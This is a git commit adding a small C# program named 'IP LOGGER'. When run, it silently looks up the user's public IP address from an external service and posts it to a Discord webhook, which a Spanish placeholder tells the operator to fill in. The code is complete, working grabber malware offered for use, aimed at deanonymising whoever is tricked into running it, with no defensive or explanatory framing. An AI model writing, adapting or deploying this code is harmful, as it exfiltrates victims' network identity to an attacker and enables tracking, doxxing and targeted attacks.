83d83651b4ac6cf2bf3174a3cf0f24ec6b3b9c9e
Steven121x <Steven121x@gmail.com>
2022-09-05 12:14:05 -0400

    Hola

---
+++ IP LOGGER/Program.cs
@@ -0,0 +1,41 @@
+﻿using System;
+using System.IO;
+using System.Net;
+using System.Net.Http;
+namespace IP_LOGGER
+{
+    internal class Program
+    {
+       
+
+        static void Main(string[] args)
+        {
+           
+            send("AQUI COLOCA TU WEBHOOK DE DISCORD", $"Has obtenido una ip: {getIp()}", "StevenBot");
+            Environment.Exit(0);
+
+        }
+
+        private static void send(string url, string message, string botname)
+        {
+            connection.post(url, new System.Collections.Specialized.NameValueCollection()
+            {
+                {
+                    "username",
+                    botname
+                },
+                {
+                    "content",
+                    message
+                }
+            });
+        }
+
+
+        public static string getIp()
+        {
+            WebClient downloader = new WebClient();
+            return downloader.DownloadString("https://wtfismyip.com/text");
+        }
+    }
+}
---
+++ IP LOGGER/connection.cs
@@ -0,0 +1,21 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Collections.Specialized;
+using System.Linq;
+using System.Net;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace IP_LOGGER
+{
+    internal class connection
+    {
+        public static byte[] post(string uri, NameValueCollection pair)
+        {
+            using (WebClient wc = new WebClient())
+            {
+                return wc.UploadValues(uri, pair);
+            }
+        }
+    }
+}
